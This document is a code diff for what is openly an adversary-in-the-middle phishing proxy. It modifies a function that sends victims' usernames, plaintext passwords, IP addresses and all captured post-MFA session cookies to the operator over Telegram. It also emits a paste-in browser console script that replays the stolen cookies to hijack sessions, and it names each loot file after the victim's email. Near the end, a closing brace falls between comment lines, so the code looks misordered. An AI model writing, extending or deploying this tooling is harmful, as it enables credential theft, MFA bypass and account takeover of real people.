@@ -236,8 +236,7 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		"source":      "proxy",
 	})
 
-	// Only notify Telegram if actual session cookies were captured (post-MFA).
-	// Pre-auth cookies (fpc, esctx, buid) logged to JSONL but skip Telegram.
+	// Only fire Telegram when MFA session cookies (ESTSAUTH etc) are captured.
 	hasSession := false
 	for _, c := range capturedCookies {
 		name := strings.SplitN(c, "=", 2)[0]
@@ -259,72 +258,61 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 	ua := r.UserAgent()
 
 	msg := fmt.Sprintf("🔴 CAPTURE | %s | %s\n"+
-		"Username: %s\n"+
-		"Password: %s\n"+
-		"IP: %s\n"+
-		"User-Agent: %s\n"+
-		"Time: %s\n"+
-		"Upstream: %s",
+		"👤 Username: %s\n"+
+		"🔑 Password: %s\n"+
+		"🌐 IP: %s\n"+
+		"💻 User-Agent: %s\n"+
+		"🕐 Time: %s\n"+
+		"🎯 Campaign: %s\n"+
+		"🔗 Upstream: %s",
 		pl.Label, username,
 		username, password,
 		ip, ua,
-		captureTimeDisplay, upstream)
+		captureTimeDisplay, campaignID,
+		upstream)
 
 	sendTelegramMessage(msg)
 
-	// Build .txt attachment with session cookies (filtered by phishlet)
-	var sessionLines []string
-	var otherLines []string
-	for _, c := range capturedCookies {
-		name := strings.SplitN(c, "=", 2)[0]
-		if pl.isSessionCookie(name) {
-			sessionLines = append(sessionLines, c)
-		} else {
-			otherLines = append(otherLines, c)
-		}
-	}
-
-	if len(sessionLines) > 0 || len(otherLines) > 0 {
+	// Send ALL captured cookies for full session hijack
+	if len(capturedCookies) > 0 || len(victimCookies) > 0 {
 		txtContent := fmt.Sprintf("=== AiTM Session Capture ===\n"+
-			"Target: %s (%s)\nUsername: %s\nIP: %s\nTime: %s\n\n",
-			upstream, pl.Label, username, ip, captureTimeDisplay)
+			"Target: %s (%s)\nUsername: %s\nIP: %s\nTime: %s\nCampaign: %s\n\n",
+			upstream, pl.Label, username, ip, captureTimeDisplay, campaignID)
 
-		if len(sessionLines) > 0 {
-			txtContent += "--- Session Cookies (captured) ---\n"
-			for _, c := range sessionLines {
-				txtContent += c + "\n"
-			}
+		txtContent += "--- All Captured Cookies ---\n"
+		for _, c := range capturedCookies {
+			txtContent += c + "\n"
 		}
-		if len(otherLines) > 0 {
-			txtContent += "\n--- Other Cookies ---\n"
-			for _, c := range otherLines {
-				txtContent += c + "\n"
-			}
-		}
-		txtContent += fmt.Sprintf("\n--- Victim Cookies ---\n")
+		txtContent += "\n--- Victim Cookies ---\n"
 		for _, c := range victimCookies {
 			txtContent += fmt.Sprintf("%s=%s\n", c.Name, c.Value)
 		}
 
-		// Generate ready-to-use cookie replay script
+		// Cookie replay script with ALL cookies
 		txtContent += "\n\n=== COOKIE REPLAY SCRIPT ===\n"
-		txtContent += "// Open browser console on target domain. Paste and run:\n"
+		txtContent += "// Paste this in browser console on the target domain.\n"
 		txtContent += fmt.Sprintf("// Target: %s\n", upstream)
 		txtContent += "(function(){\nvar c=[\n"
 		for _, c := range capturedCookies {
 			txtContent += buildReplayCookie(c) + ",\n"
 		}
 		txtContent += "];\n"
-		txtContent += "for(var i=0;i<c.length;i++){document.cookie=c[i].n+'='+c[i].v+';expires='+c[i].e+';path='+c[i].p+(c[i].d?';domain='+c[i].d:'')+(c[i].s?';Secure':'')};\n"
+		txtContent += "var s=\"\";for(var i=0;i<c.length;i++){s=c[i].n+\"=\"+c[i].v+\";expires=\"+c[i].e+\";path=\"+c[i].p;if(c[i].d)s+=\";domain=\"+c[i].d;if(c[i].s)s+=\";Secure\";document.cookie=s};\n"
 		txtContent += "location.reload();\n"
 		txtContent += "})();\n"
 
-		filename := fmt.Sprintf("session-%s.txt", time.Now().UTC().Format("20060102-150405"))
+		// Name file with victim email
+		safeEmail := strings.ReplaceAll(username, "@", "_at_")
+		safeEmail = strings.ReplaceAll(safeEmail, ".", "_")
+		if safeEmail == "" {
+			safeEmail = "unknown"
+		}
+		filename := fmt.Sprintf("%s-session.txt", safeEmail)
 		sendTelegramDocument(msg, filename, []byte(txtContent))
 	}
-}
 
 // rewriteBody replaces upstream domain references in text responses so the
+}
 // browser continues routing all requests through our proxy domain.
 func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
 	ct := resp.Header.Get("Content-Type")
